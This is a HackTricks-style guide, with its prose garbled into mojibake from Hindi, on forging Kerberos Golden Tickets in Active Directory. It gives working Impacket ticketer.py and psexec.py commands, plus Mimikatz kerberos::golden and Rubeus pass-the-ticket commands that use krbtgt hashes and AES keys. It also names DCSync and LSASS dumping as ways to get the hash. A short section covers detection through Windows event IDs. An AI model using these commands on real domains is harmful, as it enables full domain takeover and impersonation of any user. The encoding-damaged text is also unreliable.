# рд╕реЛрдиреЗ рдХрд╛ рдЯрд┐рдХрдЯ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## рд╕реЛрдиреЗ рдХрд╛ рдЯрд┐рдХрдЯ

**рдПрдХ рд╕реЛрдиреЗ рдХрд╛ рдЯрд┐рдХрдЯ** рд╣рдорд▓рд╛ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддреЗ рд╣реБрдП рдПрдХ рд╡реИрдз рдЯрд┐рдХрдЯ рдЧреНрд░рд╛рдВрдЯрд┐рдВрдЧ рдЯрд┐рдХрдЯ (TGT) рдХрд╛ рдирд┐рд░реНрдорд╛рдг** рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА (AD) krbtgt рдЦрд╛рддреЗ рдХреЗ NTLM рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдлрд╛рдпрджреЗрдордВрдж рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдЕрдиреБрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдбреЛрдореЗрди рдХреЗ рдХрд┐рд╕реА рднреА рд╕реЗрд╡рд╛ рдпрд╛ рдорд╢реАрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**ред рдпрд╣ рдпрд╛рдж рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **krbtgt рдЦрд╛рддреЗ рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ**ред

**krbtgt рдЦрд╛рддреЗ рдХреЗ NTLM рд╣реИрд╢** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рдЕрдкрдирд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ **рд▓реЛрдХрд▓ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЙрдкрд╕реНрдерд┐рддрд┐ рд╕реЗрд╡рд╛ (LSASS) рдкреНрд░рдХреНрд░рд┐рдпрд╛** рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдбреЛрдореЗрди рдХреЗ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ (DC) рдкрд░ рд╕реНрдерд┐рдд **NT рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗрд╡рд╛рдПрдВ (NTDS.dit) рдлрд╝рд╛рдЗрд▓** рд╕реЗред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **DCsync рд╣рдорд▓рд╛ рдЪрд▓рд╛рдирд╛** рдЗрд╕ NTLM рд╣реИрд╢ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рд░рдгрдиреАрддрд┐ рд╣реИ, рдЬрд┐рд╕реЗ **Mimikatz рдореЗрдВ lsadump::dcsync рдореЙрдбреНрдпреВрд▓** рдпрд╛ Impacket рджреНрд╡рд╛рд░рд╛ **secretsdump.py рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдЗрди рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреЛ рдЖрдЧреЗ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдпрд╛ рдПрдХ рд╕рдорд╛рди рд╕реНрддрд░ рдХреА рдкрд╣реБрдВрдЪ рдЖрдо рддреМрд░ рдкрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддреА рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐ NTLM рд╣реИрд╢ рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рд╡рд┐рдзрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕реЗ **рд╕рдВрдЪрд╛рд▓рди рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ** рдХреЗ рд▓рд┐рдП **рдЙрдиреНрдирдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдорд╛рдирдХ (AES) рдХреЗрд░рдмреЗрд░реЛрд╕ рдХреБрдВрдЬрд┐рдпреЛрдВ (AES128 рдФрд░ AES256) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯрд┐рдХрдЯ рдЬрд╛рд▓реА рдмрдирд╛рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИ**ред

{% code title="рд▓рд┐рдирдХреНрд╕ рд╕реЗ" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="From Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**рдПрдХ рдмрд╛рд░** рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ **рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдЗрдВрдЬреЗрдХреНрдЯ** рд╣реЛ рдЬрд╛рдП, рддреЛ рдЖрдк рд╕рд╛рдЭрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ **(C$)** рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рд╕реЗрд╡рд╛рдПрдВ рдФрд░ WMI рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЖрдк **psexec** рдпрд╛ **wmiexec** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЖрдк рд╡рд┐рдирд░реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╢реИрд▓ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### рд╕рд╛рдорд╛рдиреНрдп рдкрдХрдбрд╝реЛрдВ рдХреЛ рдЫрд▓рдирд╛

рдЧреЛрд▓реНрдбрди рдЯрд┐рдХрдЯ рдХреЛ рдкрдХрдбрд╝рдиреЗ рдХреЗ рд╕рдмрд╕реЗ рдЖрдо рддрд░реАрдХреЗ рд╣реИрдВ **рддрд╛рд░ рдкрд░ рдХрд░рдмреЗрд░реЛрд╕ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдХреЗред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Mimikatz **TGT рдХреЛ 10 рд╡рд░реНрд╖реЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИ**, рдЬреЛ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд┐рдП рдЧрдП рдЖрдЧрд╛рдореА TGS рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рд╡рд┐рдЪрд┐рддреНрд░ рд░реВрдк рд╕реЗ рдкреНрд░рдХрдЯ рд╣реЛрдЧрд╛ред

`рдЖрдпреБ : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

рдЖрд░рдВрдн рдСрдлрд╕реЗрдЯ, рдЕрд╡рдзрд┐ рдФрд░ рдЕрдзрд┐рдХрддрдо рдирд╡реАрдХрд░рдгреЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/startoffset`, `/endin` рдФрд░ `/renewmax` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рд╕рднреА рдорд┐рдирдЯ рдореЗрдВ)ред
```
Get-DomainPolicy | select -expand KerberosPolicy
```
```
рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ, TGT рдХрд╛ рдЬреАрд╡рдирдХрд╛рд▓ 4769 рдореЗрдВ рд▓реЙрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рд╡рд┐рдВрдбреЛрдЬ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧреНрд╕ рдореЗрдВ рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдирд╣реАрдВ рдкрд╛рдПрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **4768 рдХреЗ рдкреВрд░реНрд╡ 4769 рджреЗрдЦрдирд╛**ред рдПрдХ TGT рдХреЗ рдмрд┐рдирд╛ рдПрдХ TGS рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ **рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ**, рдФрд░ рдЕрдЧрд░ рдХрд┐рд╕реА TGT рдХреЗ рдЬрд╛рд░реА рд╣реЛрдиреЗ рдХрд╛ рдХреЛрдИ рд░рд┐рдХреЙрд░реНрдб рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдо рдпрд╣ рд╕рдордЭ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдСрдлрд▓рд╛рдЗрди рдЬрд╛рд▓реА рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЗрд╕ рдбрд┐рдЯреЗрдХреНрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХреЛ **рдЫрд▓рд╛рдВрдЧ рджреЗрдиреЗ** рдХреЗ рд▓рд┐рдП рдбрд╛рдпрдордВрдб рдЯрд┐рдХрдЯреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп

* 4624: рдЦрд╛рддрд╛ рд▓реЙрдЧрдСрди
* 4672: рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд▓реЙрдЧрдСрди
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List тАУProperty`

рд░рдХреНрд╖рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЫреЛрдЯреЗ рддрд░реАрдХреЗ рд╣реИрдВ **4769 рдХреЗ рд▓рд┐рдП рдЪреЗрддрд╛рд╡рдиреА рджреЗрдирд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ** рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ рдЦрд╛рддрд╛ред

## рд╕рдВрджрд░реНрдн
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
```
